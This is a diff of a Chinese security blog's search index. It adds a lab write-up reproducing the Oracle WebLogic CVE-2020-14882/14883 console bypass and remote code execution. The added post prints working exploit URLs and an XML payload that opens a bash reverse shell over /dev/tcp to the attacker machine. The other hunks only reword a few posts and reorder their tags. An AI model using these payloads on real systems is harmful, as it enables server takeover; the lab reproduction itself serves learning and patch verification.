@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2020-14882/14883漏洞复现</title>
+    <url>/2021/02/22/CVE-2020-14882-14883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　对CVE-2020-14882和CVE-2020-14883分别进行简要说明和复现，并反弹shell至攻击机；</p>
+<a id="more"></a>
+<h1 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h1><p>　　Oracle WebLogic Server 远程代码执行漏洞 （CVE-2020-14882），远程攻击者可通过构造特殊的 HTTP GET 请求，在受影响的 WebLogic上执行代码。结合 CVE-2020-14883 权限绕过漏洞，即可在未经身份验证的情况下直接接管 WebLogic Server Console ，并在受影响的 WebLogic Server 上执行任意代码，获取系统权限。<br>　　影响范围：</p>
+<ul>
+<li>Oracle Weblogic Server 10.3.6.0.0</li>
+</ul>
+<ul>
+<li>Oracle Weblogic Server 12.1.3.0.0</li>
+</ul>
+<ul>
+<li>Oracle Weblogic Server 12.2.1.3.0</li>
+</ul>
+<ul>
+<li>Oracle Weblogic Server 12.2.1.4.0</li>
+</ul>
+<ul>
+<li>Oracle Weblogic Server 14.1.1.0.0</li>
+</ul>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>受害机：192.168.229.132 Ubuntu16 </p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/受害机.png">
+<p>服务器：192.168.229.131 Windows7 </p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/服务器.png">
+<p>攻击机：192.168.229.128 KaliLinux </p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/攻击机.png">
+
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>在受害机中使用docker开启vulhub-weblogic-cve-2020-14882环境</p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/docker.png">
+<p>本地网中访问192.168.229.132/console 即可进入weblogic控制台登录页面</p>
+<h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><p>测试CVE-2020-14883 权限绕过，请求以下URL，即可未授权访问到后台页面进而执行命令：</p>
+<p><code>http://192.168.229.132:7001/console/css/%252e%252e%252fconsole.portal</code></p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/14883.png">
+
+<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>测试CVE-2020-14882 远程代码执行，使用如下poc进行get请求，执行命令 touch /tmp/success1<br><code>http://192.168.229.132:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;)</code></p>
+<p>请求完成后页面会显示404，理论上是有可能执行成功的；</p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/404.png">
+
+<p>进入docker目录下检查执行结果，依次执行：<br><code>docker ps -a</code><br><code>docker exec -it cffbf356e2e5 /bin/bash</code><br><code>ls /tmp/</code><br>在tmp下发现success1文件，命令执行成功。</p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/14882.png">
+
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>加载远程服务器恶意xml反弹shell到攻击机。该方法只能在Weblogic 12.2.1 以上版本利用，因为Weblogic 10.3.6 并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p>
+<p>在Win7服务器上准备test.xml文件，并且能够被远程访问；(python3\phpstudy)</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.229.128/1234 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在Kali攻击机上监听端口 <code>nc -lvvp 1234</code><br>在任意浏览器访问<br>    <a href="http://192.168.229.132:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.229.131/test.xml&quot;)" target="_blank" rel="noopener">http://192.168.229.132:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.229.131/test.xml&quot;)</a></p>
+<p>之后页面显示404或者一直处于加载状态，实际上shell已经反弹至kali<br>测试执行ls：成功反弹shell</p>
+<img src="/2021/02/22/CVE-2020-14882-14883漏洞复现/shell.png">
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JWT认证与缺陷分析</title>
     <url>/2021/02/07/JWT%E8%AE%A4%E8%AF%81%E4%B8%8E%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　关于JWT认证的分析。全文从什么是JWT，JWT应用场景，JWT应用过程，JWT可能存在的隐患四大方面描述了ＪＷＴ的基本情况，并对可能存在的漏洞点进行了分析；总结前人的经验，化为己用。</p>
@@ -109,7 +166,7 @@
   <entry>
     <title>OAuth2认证与缺陷分析</title>
     <url>/2021/02/02/OAuth2%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　前段时间做了很久的内网资产的渗透测试，发现在http头中常常会看见类似这样的字段<br>　　<code>Authorization: AOEWQ315na39NGanUAsBO=</code><br>　　猜想是一种认证方式，我个人认为只要进行了认证就总会有漏洞的，但是看了好几个站都没什么头绪。百度了一下发现是使用的OAuth2认证，以前没接触过，刚好最近有时间就针对性的分析一下。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　前段时间做了很久的内网资产的渗透测试，发现在http头中常常会看见类似这样的字段<br>　　<code>Authorization: AOEWQ315na39NGanUAsBO=</code><br>　　猜想是一种认证方式，我个人认为只要进行了认证就总会有漏洞的，但是看了好几个站都没什么头绪。百度了一下发现可能是使用了OAuth2认证，在此针对性的分析学习一下。</p>
 <a id="more"></a>
 
 <h1 id="数据授权服务应用场景"><a href="#数据授权服务应用场景" class="headerlink" title="数据授权服务应用场景"></a>数据授权服务应用场景</h1><p>　<img src="/2021/02/02/OAuth2认证缺陷分析/应用场景.png"></p>
@@ -199,7 +256,7 @@ client_id=8888&amp;client_secret=ccppo123&amp;grant_type=ccbbaa&amp;code=1122aa3
   <entry>
     <title>php代码审计-DVWA</title>
     <url>/2021/01/08/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DVWA/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近不想挖src了，太肝了，常规漏洞总是撞洞。想挖一些不常见的高危不太容易，沉淀积累一下过段时间再说。现在空闲时间先练练审计吧，对DVWA内的漏洞代码进行审计，基础的不能再基础了，不难。重在思考。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对DVWA内的漏洞代码进行审计，基础的不能再基础了，不难。重在思考。</p>
 <a id="more"></a>
 
 <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>DVWA命令执行，level=LOW；无任何过滤</p>
@@ -1010,8 +1067,8 @@ Hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></pre></li>
       <tags>
         <tag>Web</tag>
         <tag>漏洞</tag>
-        <tag>靶场练习</tag>
         <tag>Web渗透</tag>
+        <tag>靶场练习</tag>
       </tags>
   </entry>
   <entry>
@@ -1217,9 +1274,9 @@ Hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1</code></pre></li>
       </categories>
       <tags>
         <tag>Web</tag>
+        <tag>Web渗透</tag>
         <tag>靶场练习</tag>
         <tag>sql注入</tag>
-        <tag>Web渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1390,9 +1447,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>靶场练习</tag>
         <tag>Web渗透</tag>
         <tag>XSS</tag>
+        <tag>靶场练习</tag>
       </tags>
   </entry>
   <entry>
@@ -1490,9 +1547,9 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </categories>
       <tags>
         <tag>Web</tag>
+        <tag>Web渗透</tag>
         <tag>靶场练习</tag>
         <tag>sql注入</tag>
-        <tag>Web渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1708,8 +1765,8 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>信息搜集</tag>
         <tag>社工</tag>
+        <tag>信息搜集</tag>
       </tags>
   </entry>
   <entry>
@@ -1776,15 +1833,15 @@ myqr.run(
       </categories>
       <tags>
         <tag>Web</tag>
-        <tag>sql注入</tag>
         <tag>Web渗透</tag>
         <tag>XSS</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
     <title>CVE-2019-0708漏洞复现</title>
     <url>/2019/10/01/CVE-2019-0708/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>北京时间5月15日，微软发布了针对远程桌面服务的远程执行代码漏洞CVE-2019-0708的修复程序, 漏洞触发无需用户交互。这也就意味着，攻击者可以利用该漏洞制作类似于2017年席卷全球的WannaCry类的蠕虫病毒，进行大规模传播和破坏。</p>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>北京时间5月15日，微软发布了针对远程桌面服务的远程执行代码漏洞CVE-2019-0708的修复程序, 漏洞触发无需用户交互。这也就意味着，攻击者可以利用该漏洞制作类似于2017年席卷全球的WannaCry类的蠕虫病毒，进行大规模传播和破坏。</p>
 <p>远程桌面服务（以前称为终端服务）中存在远程执行代码漏洞，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序; 查看，更改或删除数据; 或创建具有完全用户权限的新帐户。要利用此漏洞，攻击者仅需要通过RDP向目标系统远程桌面服务发送恶意请求。</p>
 <a id="more"></a>
 
@@ -1804,10 +1861,10 @@ myqr.run(
 <p>6、2019年6月8日<br>Metasploit的商业版本开始提供能导致远程代码执行的漏洞利用模块</p>
 <p>7、2019年7月31日<br>商业漏洞利用套件Canvas加入了CVE-2019-0708的漏洞利用模块</p>
 <p>8、2019年9月7日<br>已有公开渠道的Metasploit CVE-2019-0708漏洞利用模块发布，构成现实的蠕虫威胁。</p>
-<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><pre><code>靶机：cn_windows_7_ultimate_with_sp1_x64  10.10.10.129
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>靶机：cn_windows_7_ultimate_with_sp1_x64  10.10.10.129
 
 主机：Kali Linux 10.10.10.128
-     配置CVE 2019-0708相关EXP</code></pre><h2 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h2><p>1、靶机关闭防火墙，开启3389端口，开启远程服务</p>
+     配置CVE 2019-0708相关EXP</code></pre><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>1、靶机关闭防火墙，开启3389端口，开启远程服务</p>
 <p>2、kali中对EXP进行如下替换（EXP Github：<a href="https://github.com/rapid7/metasploit-framework/pull/12283/files）">https://github.com/rapid7/metasploit-framework/pull/12283/files）</a></p>
 <pre><code>rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb
 
@@ -1832,14 +1889,14 @@ exploit</code></pre><p>4、执行成功</p>
 <p><a href="https://www.cnblogs.com/nul1/p/11482119.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/11482119.html</a></p>
 <p><a href="https://blog.csdn.net/qq_29647709/article/details/100610285" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/100610285</a></p>
 <p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference</a>        </p>
-<h2 id="0x03-最后附上补丁地址"><a href="#0x03-最后附上补丁地址" class="headerlink" title="0x03 最后附上补丁地址"></a>0x03 最后附上补丁地址</h2><p>官方补丁下载</p>
+<h1 id="补丁地址"><a href="#补丁地址" class="headerlink" title="补丁地址"></a>补丁地址</h1><p>官方补丁下载</p>
 <p>Windows 7 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows 7 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows Server 2008 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu</a><br>Windows Server   2008 Itanium<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</a><br>Windows Server 2008 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu</a><br>Windows Server 2008 R2 Itanium<br>    <a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu</a><br>Windows Server 2008 R2 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Server   2003 x86<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe</a><br>Windows Server 2003 x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</a><br>Windows XP SP3<br>    <a href="http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe</a><br>Windows XP SP2 for x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe</a><br>Windows XP SP3 for XPe<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</a><br>WES09 and   POSReady 2009<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe</a></p>
 ]]></content>
       <categories>
         <category>学习笔记</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
